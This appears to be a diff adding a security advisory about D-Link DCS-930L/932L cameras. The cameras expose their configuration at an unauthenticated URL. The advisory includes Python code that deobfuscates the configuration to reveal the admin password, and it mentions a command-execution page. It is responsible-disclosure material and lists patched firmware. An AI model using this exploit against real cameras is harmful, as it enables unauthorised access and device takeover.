@@ -1,0 +1,110 @@
+Unauthenticated remote access to D-Link DCS cameras
+===================================================
+
+[ADVISORY INFORMATION]
+Title:    Unauthenticated remote access to D-Link DCS cameras
+Discovery date: 20/06/2012
+Release date:   28/01/2013
+Credits:        Roberto Paleari (roberto@greyhats.it, twitter: @rpaleari)
+
+[VULNERABILITY INFORMATION]
+Class:           Authentication bypass, Remote command execution
+
+[AFFECTED PRODUCTS]
+This security vulnerability affects the following products and firmware
+versions:
+   * D-Link DCS-930L, firmware version 1.04
+   * D-Link DCS-932L, firmware version 1.02
+Other products and firmware versions are probably also vulnerable, but they
+were not checked.
+
+[VULNERABILITY DETAILS]
+D-Link DCS web cameras allow unauthenticated attackers to obtain the
+configuration of the device remotely. A copy of the device configuration can be
+obtained by accessing the following URL:
+
+  http://<device IP address>/frame/GetConfig
+
+The obtained configuration file is obfuscated using a trivial obfuscation
+scheme. Python code for the deobfuscation follows (sorry, the code is quite a
+mess :-)):
+
+<cut>
+# 'data' holds the content of the obfuscated configuration file
+def deobfuscate(data):
+    r = []
+    for c in data:
+        c = ord(c)
+        c = (c + ord('y')) & 0xff
+        c = (c ^ ord('Z')) & 0xff
+        c = (c - ord('e')) & 0xff
+        r.append(c)
+
+    tmp = None
+    i = len(r) - 1
+    while i >= 0:
+        if i == len(r) - 1:
+            x = r[i]
+            tmp = ((x & 7) << 5) & 0xff
+
+        if i == 0:
+            assert tmp is not None
+            x = r[0]
+            x = (x >> 3) & 0xff
+            x = (x + tmp) & 0xff
+            r[0] = x
+        else:
+            c1 = r[i-1]
+            c2 = r[i]
+            c1 = c1 & 0x7
+            c2 = (c2 >> 3) & 0xff
+            c1 = (c1 << 5) & 0xff
+            c2 = (c2 + c1) & 0xff
+            r[i] = c2
+        i = i - 1
+
+    r = "".join([chr(x) for x in r])
+
+    s = ""
+    assert (len(r) % 2) == 0
+    for i in range(len(r)/2):
+        s += r[i+(len(r)/2)] + r[i]
+    
+    return s
+</cut>
+
+The above procedure returns the deobfuscated ASCII version of the
+configuration file. This file includes, among other things, also the web
+password for the "admin" user.
+
+As a side note, it is worth considering that, after exploiting this issue,
+authenticated attackers can also leverage the undocumented /docmd.htm web page
+to execute arbitrary commands on the affected devices.
+
+[REMEDIATION]
+This issue has been addressed by D-Link in the following firmware releases:
+* DCS-930L V1.06B5 (August 15, 2012)
+* DCS-932L V1.04B5 (August 15, 2012)
+
+These updates are available through mydlink.com and have also been implemented
+on DCS-942L and higher camera products.
+
+[DISCLOSURE TIME-LINE]
+    * 20/06/2012 - Initial vendor contact.
+
+    * 11/07/2012 - The author provided D-Link with the details of the
+                   vulnerability.
+
+    * 12/07/2012 - D-Link confirmed the issue is a new security vulnerability.
+
+    * 26/01/2013 - D-Link confirmed the release of firmware versions that
+             address the vulnerability.
+
+    * 28/01/2013 - Public disclosure.
+
+[DISCLAIMER]
+The author is not responsible for the misuse of the information provided in
+this security advisory. The advisory is a service to the professional security
+community. There are NO WARRANTIES with regard to this information. Any
+application or distribution of this information constitutes acceptance AS IS,
+at the user's own risk. This information is subject to change without notice.
